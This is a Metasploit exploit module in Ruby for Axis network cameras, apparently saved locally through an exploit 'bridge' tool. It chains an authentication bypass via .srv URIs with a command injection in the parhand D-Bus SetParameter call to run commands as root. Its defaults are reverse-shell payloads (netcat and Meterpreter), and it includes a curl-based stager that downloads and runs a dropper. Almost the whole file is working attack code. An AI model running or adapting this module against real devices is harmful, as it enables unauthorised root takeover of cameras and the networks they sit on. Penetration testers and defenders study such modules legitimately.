##
# Metasploit Module — saved locally via SuiteXPL MSF Bridge
# Source: https://github.com/rapid7/metasploit-framework
# CVE: CVE-2018-10660, CVE-2018-10661, CVE-2018-10662
# Affects: Axis network cameras with firmware < 2018 (parhand RCE via .srv auth bypass)
# Bridge: embedxpl.core.bridges.exploit_bridge.run_via_msfconsole("axis_srv_parhand_rce")
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Axis Network Camera .srv-to-parhand RCE',
      'Description' => %q{
        Exploits an auth bypass in .srv functionality (CVE-2018-10661/10662) and
        a command injection in parhand (CVE-2018-10660) to execute code as root.
        Affects Axis cameras with firmware before the June 2018 security update.
      },
      'License' => MSF_LICENSE,
      'Author' => ['Or Peles', 'wvu', 'sinn3r', 'Brent Cook', 'Jacob Robles', 'Matthew Kienow', 'Shelby Pace', 'Chris Lee', 'Cale Black'],
      'References' => [
        ['CVE', '2018-10660'], ['CVE', '2018-10661'], ['CVE', '2018-10662'],
        ['URL', 'https://blog.vdoo.com/2018/06/18/vdoo-discovers-significant-vulnerabilities-in-axis-cameras/'],
        ['URL', 'https://www.axis.com/files/faq/Advisory_ACV-128401.pdf']
      ],
      'DisclosureDate' => '2018-06-18',
      'Privileged' => true,
      'Targets' => [
        ['Unix In-Memory', {'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Type' => :unix_memory,
          'Payload' => {'BadChars' => ' ', 'Encoder' => 'cmd/ifs', 'Compat' => {'PayloadType' => 'cmd', 'RequiredCmd' => 'netcat-e'}},
          'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'}}],
        ['Linux Dropper (ARM)', {'Platform' => 'linux', 'Arch' => ARCH_ARMLE, 'Type' => :linux_dropper,
          'DefaultOptions' => {'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp'}}]
      ],
      'DefaultTarget' => 1,
      'DefaultOptions' => {'WfsDelay' => 10},
      'Notes' => {'Reliability' => UNKNOWN_RELIABILITY, 'Stability' => UNKNOWN_STABILITY, 'SideEffects' => UNKNOWN_SIDE_EFFECTS}
    ))
  end

  def check
    res = send_request_cgi('method' => 'GET', 'uri' => "/index.html/#{rand_srv}")
    return CheckCode::Appears('Target appears vulnerable') if res && res.code == 204
    CheckCode::Safe
  end

  def exploit
    case target['Type']
    when :unix_memory; execute_command(payload.encoded)
    when :linux_dropper; execute_cmdstager(flavor: :curl, nospace: true)
    end
  end

  def execute_command(cmd, _opts = {})
    send_request_cgi('method' => 'POST', 'uri' => "/index.html/#{rand_srv}",
      'vars_post' => {'action' => 'dbus', 'args' => dbus_send(method: :set_param,
        param: "string:root.Time.DST.Enabled string:;(#{cmd})&")})
    send_request_cgi('method' => 'POST', 'uri' => "/index.html/#{rand_srv}",
      'vars_post' => {'action' => 'dbus', 'args' => dbus_send(method: :synch_params)})
  end

  def dbus_send(method:, param: nil)
    args = '--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand '
    args << case method
            when :set_param; "com.axis.PolicyKitParhand.SetParameter #{param}"
            when :synch_params; 'com.axis.PolicyKitParhand.SynchParameters'
            end
    args
  end

  def rand_srv; "#{Rex::Text.rand_text_alphanumeric(8..42)}.srv"; end
end
